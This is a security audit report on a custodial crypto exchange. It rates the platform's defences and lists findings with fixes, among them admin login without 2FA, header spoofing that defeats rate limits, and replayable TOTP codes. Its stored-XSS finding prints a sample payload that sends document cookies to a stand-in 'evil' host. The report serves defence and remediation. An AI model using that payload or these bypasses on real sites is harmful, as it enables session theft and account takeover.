# Phase 3D — Security Audit (OWASP Top 10 / API Top 10)

**Date:** 2026-07-05 · **Method:** parallel app-sec readers over authz/IDOR, security headers/CORS/CSRF/cookies, uploads/MinIO/KYC, secrets/crypto/keys, and money-path abuse/race/DoS → adversarial exploit-verification of critical/high vulns → a dedicated injection/SSRF/XSS/SSTI backfill sweep → hard-calibrated scoring against a custodial-crypto bar. All findings cite code read directly.
**Verdict:** **HOLD launch — conditional pass, remediation-gated.** The part that most directly protects customer funds is genuinely well built, but the platform is not yet secure enough to custody real money at public scale. **No critical vulnerabilities and no architectural rework required** — a focused checklist of one High plus deployment-config Mediums.

## Scores (calibrated hard against a custodial-crypto platform)

| Dimension | Score | One-line |
|---|---|---|
| **AppSec** | **70/100** | Ledger/escrow core strong; second-factor + business-flow weaknesses stop short of the ledger |
| **Data protection** | **66/100** | Key custody + crypto verified strong; PII-handling gaps (EXIF, retention, AV) |
| **AuthZ** | **63/100** | Object-level authz excellent; dragged down by admin *authentication* strength |
| **InfraSec** | **55/100** | Lowest — the production perimeter is the clearest launch blocker |

Severity tally: **1 High · ~19 Medium · ~16 Low · Info** across ~40 findings (injection sweep added 1 Medium; the rest of the injection surface is clean).

## What is solid — verified against source

- **Object-level authorization is excellent.** The IDOR/BOLA sweep is **clean** across trades, wallets, KYC, disputes, withdrawals, offers, chat, notifications, and sessions — **ownership is enforced in the SQL `WHERE` clause, not in app logic** — and no cross-user read/write could be constructed. **Every `/admin/**` route carries an explicit `@Roles` from the RBAC matrix**; no admin route is reachable by a user token or missing function-level authz.
- **Fund-custody core is the strongest area:** append-only idempotent ledger with sorted `FOR UPDATE` locks + hard non-negative-balance invariant; guarded `WHERE status=…` transitions; withdrawal daily-cap TOCTOU closed with a per-user advisory lock; deposit credit idempotent on `tx_hash:log_index`; **prices/fees taken from the offer/settings, never the client** (client-side price/fee manipulation impossible); self-trade blocked.
- **Key custody verified:** xpub-only derivation **rejects any xprv**; no seed/mnemonic/signing code in api/worker; signer isolated + hard-stops in prod. **Crypto is sound:** argon2id exceeds OWASP minimums; AES-256-GCM used correctly (random 96-bit IV, tag verified, generic errors).
- **Upload front door is solid:** magic-byte whitelists, private buckets, server-generated keys, path traversal blocked (with tests), short-TTL RBAC-gated presigned GETs, no IDOR.
- **Injection surface is clean:** SQL fully parameterized end-to-end (admin ILIKE search uses bound params; the only raw interpolation is env-sourced role passwords in migrations — not attacker-reachable); **all outbound HTTP is env-pinned** (TronGrid/RPC/webhook/MinIO/SMTP/signer — no user/admin field steers a server-side fetch → no SSRF); **no `dangerouslySetInnerHTML`/`eval`/`new Function`/dynamic `require`** anywhere; email templates are static Handlebars over a whitelisted server-derived context sent **text-only**; no open redirect; no header/log-injection sink takes user free-text.

## HIGH finding (adversarially CONFIRMED)

**D-H1 · Admin login does not enforce 2FA even when `ADMIN_2FA_REQUIRED=true`; a password-only admin gets a full admin JWT in production.**
`admin-auth.service.ts:91` gates the second factor only on the admin's own enrollment flag (`if (admin.totp_enabled)`), and the seeded bootstrap SUPER_ADMIN ships **2FA-disabled** (`seed-admin.ts:51`, comment admits "TOTP is OPTIONAL (test phase)"). `ADMIN_2FA_REQUIRED` (forced true in prod by `env.ts:130`) is consulted **only** in the money-action step-up (`verifyTotp` — 7 callers: withdrawal approve/reject, dispute resolve, kill switch, settings, ledger adjustment, country update). So **`setUserStatus` (freeze/suspend), KYC review + document access, sanctions block/unblock, content CRUD, and every read dashboard have no step-up.** A single phished/stuffed/leaked admin password yields a full session that can **exfiltrate every customer's KYC identity documents and mass-manipulate users and KYC decisions.** Fund theft alone is blocked by the fail-closed step-up — which is why this is High, not Critical — but *a custodial platform cannot ship a console where all customer PII is one phished password away.* **Fix:** when `ADMIN_2FA_REQUIRED` is true, block login for un-enrolled admins (force enrollment via a restricted setup-only session) and require a valid TOTP on every admin login; never seed the bootstrap admin in an operational non-2FA state.

## Production-perimeter Mediums (three are live in the deployment TODAY)

- **D-M1 · `trustProxy:true` behind nginx → `req.ip` is the attacker-controlled leftmost `X-Forwarded-For`.** This simultaneously (a) **defeats every per-IP `@Throttle` bucket** via header rotation (credential stuffing / reset-bombing) and (b) **poisons the hash-chained audit log and the risk scorer with forged source IPs.** Fix: pin `trustProxy` to the exact nginx hop IP/CIDR.
- **D-M2 · The web origin ships zero security headers** — no HSTS (SSL-strip on first visit against the credential UI), no CSP/X-Frame-Options (clickjacking of escrow-release/withdrawal actions), `x-powered-by` leak. (Confirms Phase 1 C5 / 3F F-C4.) Fix at a version-controlled edge + `next.config.ts headers()`.
- **D-M3 · The refresh cookie is issued WITHOUT `Secure` in the live deployment** — `Secure` is gated on `NODE_ENV==='production'` but the box runs `NODE_ENV=staging`, so the long-lived refresh cookie goes over public HTTPS without `Secure` (interceptable given the missing HSTS). Fix: key `Secure` on HTTPS/`!== development`, not `=== production`.
- **D-M4 · Rate limiting is in-memory per-process** — resets on deploy, multiplies across instances (weakens the auth brute-force limits). (3B/3F corroborate.) Fix: back the throttler + admin-login limiter with Redis.

## Second-factor & business-flow Mediums

- **D-M5 · TOTP codes are never single-use** — replayable within the ~30s step across login, withdrawal approval, seller-confirm, and admin step-up (a code captured via the SSL-strippable origin or shoulder-surf is replayable against every gate, **including the fail-closed withdrawal/ledger-adjustment step-ups**). Fix: persist the last consumed timestep per user and reject reuse.
- **D-M6 · The seller-confirm PIN attempt counter is a non-atomic read-modify-write** — parallel requests read the pre-increment value, so the 5-try lockout never trips and the low-entropy 6-digit PIN becomes brute-forceable. Fix: atomic `UPDATE … RETURNING`.
- **D-M7 · `openTrade` ignores its idempotencyKey with no concurrent-trade cap** → duplicate trades + escrow-lock griefing. (3B-M1, 3G-H1 corroborate — three phases, one bug.)
- **D-M8 · `verifyChain()` loads the entire unbounded `audit_logs` table into memory** — an OOM DoS reachable by the **low-privilege AUDITOR role** (takes down the whole API). (3B, 3E corroborate.)
- `computeFee` permits `fee_bps` up to 100% (3B corroborates); `RolesGuard` treats an absent principal as public (fails open); JWT verification algorithms not pinned; chat WebSocket gateway reflects any origin with credentials (`origin:true`) — defense-in-depth only, since it authenticates from a JS-supplied Bearer, not cookies.

## Data-protection Mediums

- **D-M9 · No EXIF/metadata stripping or image re-encode — and `sharp` is not even a backend dependency, despite code comments claiming a "sharp EXIF strip."** KYC selfies/ID photos and chat images are persisted raw, leaking **embedded GPS coordinates and device metadata** to admin reviewers and trade counterparties. **This directly contradicts the spec's claimed upload pipeline** — a false comment masking the gap in review. Fix: add `sharp`, re-encode image mimes with metadata stripped (also fixes decompression-bomb and normalizes format).
- **D-M10 · Indefinite PII retention** — only the `kyc` bucket has a purge job; **chat attachments and dispute evidence (payment proofs, bank statements, IDs) have no delete path at all**, and orphaned KYC uploads are never tracked (POST /kyc/upload persists with no DB row/retention date). Unbounded breach-blast-radius + privacy-regime liability (Law 2024/017). Fix: track every upload durably + retention jobs for chat/disputes.
- **D-M11 · Production secret hard-stops are too narrow** — `validateEnv` blocks only the specific published dev master key and JWT secret; the well-known dev **Postgres/MinIO/SMTP passwords** from `.env.example` boot clean in prod. (3F corroborates.) Fix: reject the known dev defaults for all credentials.
- **D-M12 · No AV scanning on any upload path** — ClamAV is fully provisioned (env + Docker) but **never invoked**; add a fail-closed scan step before `putObject`. Worker logger has no secret redaction (3B/3F). Upload endpoints have no dedicated rate limit (storage-exhaustion DoS + PII flooding). At-rest encryption is SSE-S3 (server-managed key), not per-file (documented tradeoff — add an ops canary verifying SSE is actually applied).

## NEW from the injection backfill

- **D-M13 · Stored XSS via admin-set social links.** `zSocialLinks` (`shared/src/schemas/content.ts:9-15`) accepts any bare string (no scheme check), and the **site-wide public footer** binds it raw as `<a href={company.social[key]}>` (`public-footer.tsx:102`). A content-admin can set `social.facebook = "javascript:fetch('https://evil/c?'+document.cookie)"`; every public visitor who clicks the icon executes attacker JS (React renders `javascript:` URIs with only a dev warning; `target="_blank"` does not mitigate). Persistent XSS on unauthenticated pages against all visitors and admins. **Fix:** constrain the scheme in `zSocialLinks` to `http(s)` — note `z.url()` alone does NOT block `javascript:`, an explicit allow-list is required — and/or normalize the scheme at the sink. *(This is the ONLY exploitable injection sink; `email`/`phone` render as fixed `mailto:`/`tel:` and are safe.)*

## Also (Low/defense-in-depth)

No admin token/session revocation (deactivated/role-changed admin keeps access for the token TTL — the admin-side of the unimplemented `sid` denylist; 3B-H1); AML re-screening only at request time, not at approval/signing (3B-M3, 3E-E3); cookie-authenticated `/auth/refresh` relies solely on `SameSite=Strict` with no independent CSRF token (keep Strict; consider a double-submit token for defense-in-depth); AES-GCM triplication with 2 copies dropping the key-length check (3A/3G); no master-key rotation/versioning; 6-digit PIN brute-forceable offline on DB compromise (add a pepper).

## Path to a pass (launch gate — before any real funds)

1. **Enforce TOTP on every admin login** + force enrollment when `ADMIN_2FA_REQUIRED` is set + admin session revocation (D-H1).
2. **Fix the perimeter as a unit** — pin `trustProxy` to the edge hop; add HSTS/CSP/X-Frame-Options at a version-controlled edge and on the web origin; unconditionally set `Secure` on the refresh cookie; move rate limiting to Redis (D-M1–4).
3. **Make TOTP single-use and the PIN counter atomic** (D-M5, D-M6).
4. **Strip EXIF, implement PII retention/purge, widen the production secret hard-stops, and enable AV scanning** (D-M9–12); fix the `zSocialLinks` XSS (D-M13).

**Recommendation: HOLD launch, remediate the High and the deployment-config Mediums, re-audit those specific surfaces in the actual staging/production configuration, then release.** The ledger, escrow FSM, and signer isolation can stand — do not custody real customer funds until items 1 and 2 are closed and verified.

*Full structured findings: workflow `wf_c48dd73b-a24` journal + injection backfill agent `a234e7d4b6f1a17f2`. Cross-references: 3B (session denylist, openTrade, AML re-screen, observability), 3E (verifyChain, audit-chain), 3F (perimeter/secrets/nginx), 3A/3G (crypto triplication), Phase 1 (HSTS/CSP), 3H (fund-safety synthesis).*
